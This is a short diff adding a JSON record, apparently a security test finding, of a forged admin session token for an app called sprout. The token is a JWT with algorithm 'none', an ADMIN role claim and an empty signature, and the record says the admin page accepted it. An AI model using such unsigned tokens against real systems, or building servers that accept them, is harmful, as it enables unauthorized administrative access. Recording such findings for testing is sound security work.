@@ -1,0 +1,17 @@
+{
+  "forged_admin_session": {
+    "header": {
+      "alg": "none",
+      "typ": "JWT"
+    },
+    "payload": {
+      "sub": "1",
+      "email": "admin@sprout.local",
+      "role": "ADMIN",
+      "iat": 1787416623,
+      "exp": 1787438223
+    },
+    "signature": ""
+  },
+  "accepted_by": "GET /admin returned HTTP 200 with this unsigned token as sprout_session."
+}
